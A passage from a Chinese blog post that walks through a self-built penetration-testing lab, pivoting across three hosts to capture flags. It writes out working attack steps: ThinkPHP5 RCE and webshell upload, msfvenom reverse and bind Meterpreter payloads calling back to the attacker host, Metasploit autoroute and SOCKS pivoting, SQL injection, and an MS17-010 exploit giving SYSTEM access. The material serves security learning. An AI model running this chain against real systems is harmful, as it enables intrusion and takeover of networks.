-p80 </span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br><span class="line"> </span><br><span class="line">windows：</span><br><span class="line">利用代理工具Proxifier或SocksCap64载入代理进行进程访问测试</span><br><span class="line"> </span><br><span class="line">Target2（ubuntu x64）：</span><br><span class="line">探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3</span><br><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入</span><br><span class="line">http://192.168.22.128/index.php?r=admini/public/login #后台</span><br><span class="line">http://192.168.22.128/index.php?r=special #后门shell</span><br><span class="line"> </span><br><span class="line">1.生成正向后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br><span class="line"> </span><br><span class="line">2.访问接受：</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.128</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">3.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br><span class="line"> </span><br><span class="line">Target3:（windows7 x64）</span><br><span class="line">探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG</span><br><span class="line">proxychains4 nmap -Pn -sT 192.168.33.33</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line">dir /S flag.txt /B</span><br><span class="line">type xxxxx.txt</span><br></pre></td></tr></table></figure>

<p>案例演示</p>
<p>环境准备</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141243430-677363159.png" alt="img"></p>
<p>Target1（centos7 x64）：</p>
<p>探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag-Target2</p>
<p>&lt;1&gt;探针目标，发现target1上面部署了thinkphp v5</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141449207-1230814803.png" alt="img"></p>
<p>&lt;2&gt;验证是否存在远程命令执行漏洞，结果存在。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141500795-1559381656.png" alt="img"></p>
<p>&lt;3&gt;利用漏洞，可以直接执行命令</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141511748-671128756.png" alt="img"></p>
<p>&lt;4&gt;通过命令可以直接写入后门</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141523533-1959493924.png" alt="img"></p>
<p>&lt;5&gt;浏览器查看一下，写入成功</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141532987-534456328.png" alt="img"></p>
<p>&lt;6&gt;蚁剑连接，拿到第1个flag。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141543807-466011482.png" alt="img"></p>
<p>连接上去之后，可以用它当做跳板，但是蚁剑比较麻烦，此时可以改用CS神器或者MSF，因为使用CS或者MSF时，即使权限不够，我们也可以进行一些操作。</p>
<p>&lt;7&gt;接下来我们开始渗透Target2。kali直接与target2连接是连不上的。因为kali网段是76，target2网段是22，二者不在同一个网段，无法互联，但是target1网段是76和22，target1既跟kali同一网段，又跟target2同一网段，因此，我们可以将target1作为跳板，实现kali和target2的互联。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930141716374-784625011.png" alt="img"></p>
<p>&lt;8&gt;生成后门（kali上）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf &gt;t1.elf</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142534997-1247977894.png" alt="img"></p>
<p>&lt;9&gt;设置监听，准备接受反弹（kali上）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.76.132</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142607310-962531911.png" alt="img"></p>
<p>&lt;10&gt;将生成的后门通过蚁剑webshell上传到target1主机，执行后门。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142621255-1107109770.png" alt="img"></p>
<p>&lt;11&gt;此时kali上接收到会话，getuid可以查看会话权限。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142641436-60577561.png" alt="img"></p>
<p>&lt;12&gt;信息收集及配置访问。</p>
<p>由于测试环境是我们自己准备的，所以我们知道target2主机的网段及IP地址。但是在实战中，我们应该是未知的，因此我们需要首先进行信息收集，以获得目标target2的相关信息，为进一步的渗透做准备。</p>
<p>首先，获取网络接口：run get_local_subnets ，由结果我们得知，target1存在两个网络接口，一个76，一个22，76与kali同一网段，是连接外网的，那22就是连接内网（局域网）的。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142701998-1201811730.png" alt="img"></p>
<p>然后，查看路由地址：run autoroute -p ，发现当前的路由地址是空的</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142717416-942665604.png" alt="img"></p>
<p>接着，我们就要添加路由地址：run autoroute -s 192.168.22.0&#x2F;24</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930142745475-732674041.png" alt="img"></p>
<p>最后，再查看一下路由地址，确认添加成功。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930143503418-457556209.png" alt="img"></p>
<p>添加路由地址成功，说明在刚才反弹的session1会话上，我们添加了一个22网段的网络接口。此时我们就可以通过这个路由跟22网段进行通讯了。虽然能够通讯了，但是我们的目标是攻击target2，要攻击就需要使用到工具，由于路由是写到了maf建立的会话上面，有些工具没法用。此时我们就需要开一个代理，开这个代理就相当于开一个接口给其他人用。<br>&lt;13&gt;开启本地代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 2222</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144256720-49560385.png" alt="img"></p>
<p>&lt;14&gt;利用本地代理接口访问测试</p>
<p>首先，kali上配置proxychains（代理工具），修改&#x2F;etc&#x2F;proxychains.conf配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 192.168.76.132 2222（在配置文件中添加）</span><br></pre></td></tr></table></figure>

<p>然后，调用工具探针Target2，扫描结果发现，80端口开放。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144507023-640436449.png" alt="img"></p>
<p>接着，浏览器修改代理配置</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144522332-438108210.png" alt="img"></p>
<p>最后，此时kali上我们就可以正常访问target2上的服务了（以前是无法连接状态）</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930144537624-635637373.png" alt="img"></p>
<p>Target2（ubuntu x64）：</p>
<p>探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3</p>
<p>&lt;1&gt;探针目标，利用SQL注入，拿到后台密码，登录后台。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入</span><br><span class="line">http://192.168.22.128/index.php?r=admini/public/login #后台</span><br><span class="line">http://192.168.22.128/index.php?r=special #后门shell</span><br></pre></td></tr></table></figure>

<p>首先探针目标，在源码中直接找到线索，target2上的CMS服务存在SQL注入漏洞。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145114300-1311257096.png" alt="img"></p>
<p>然后，通过sqlmap扫描注入点找到用户名密码。</p>
<p>接着，通过robots.txt文件找到了后台地址。\</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145129341-666159460.png" alt="img"></p>
<p>最后，使用用户名密码登录后台。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145143826-1589979686.png" alt="img"></p>
<p>登录成功，拿到第2个flag。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145159105-1707108491.png" alt="img"></p>
<p>&lt;2&gt;通过后台模板功能，写入后门。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145212291-407414830.png" alt="img"></p>
<p>&lt;3&gt;配置蚁剑代理，测试连接，保存连接，访问，拿到webshell。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145426165-707940301.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145436555-605100071.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145450819-992797278.png" alt="img"></p>
<p>以上是kali linux的代理访问设置，如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。</p>
<p>Proxifier全局代理：</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145527310-1768966767.png" alt="img"></p>
<p>SocksCap64代理：</p>
<p>首先，点击代理，配置代理地址、端口和代理类型。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145859506-196828276.png" alt="img"></p>
<p>然后，点击程序，选择需要使用该代理的程序。（比如某些程序本身没有代理配置，此时就可以与SocksCap64配合使用代理）</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930145941559-446957974.png" alt="img"></p>
<p>最后，右击添加的程序，选择”在代理隧道中运行选中程序”。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150110194-182145882.png" alt="img"></p>
<p>&lt;4&gt;生成正向后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150433136-2086977233.png" alt="img"></p>
<p>&lt;5&gt;访问接收</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.128</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150452756-2132412133.png" alt="img"></p>
<p>&lt;6&gt;将后门通过webshell上传，执行</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150505424-1773934739.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150513331-350490908.png" alt="img"></p>
<p>&lt;7&gt;接收到会话</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150524993-983993102.png" alt="img"></p>
<p>&lt;8&gt;信息收集及配置访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930150816003-676531260.png" alt="img"></p>
<p>接下来对3333端口进行攻击，由于目标主机是windows系统，我们以前讲过很多攻击工具，比如，namp –script&#x3D;all、namp –script&#x3D;vuln、nessus等。</p>
<p>Target3:（windows7 x64）</p>
<p>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG</p>
<p>&lt;1&gt;探针目标，发现开放了445和3389端口，且存在MS17010漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure>

<p>&lt;2&gt;利用MS17010获取系统权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt;监听到会话，得到system权限。</p>
<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930151108406-1982534252.png" alt="img"></p>
<p>&lt;4&gt;搜索关键字，得到第3个flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">dir /S flag.txt /B</span><br><span class="line">type xxxxx.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210930151126265-242510343.png" alt="img"></p>

    </div>

    
    
    
	
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>HVVL
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2023/04/28/70-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="70-内网安全-域横向内网漫游Socks代理隧道技术">http://example.com/2023/04/28/70-内网安全-域横向内网漫游Socks代理隧道技术/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/04/27/%E5%A6%82%E4%BD%95%E5%86%99%E5%8D%9A%E5%AE%A2/" rel="prev" title="如何写博客">
      <i class="fa fa-chevron-left"></i> 如何写博客
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/04/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="汇编语言学习笔记（【汇编语言】小甲鱼零基础汇编）">
      汇编语言学习笔记（【汇编语言】小甲鱼零基础汇编） <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="HVVL"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">HVVL</p>
  <div class="site-description" itemprop="description">欢迎来到我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/HVVL404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HVVL404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-04 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">HVVL</span>
</div>

<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共43.4k字</span>
</div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
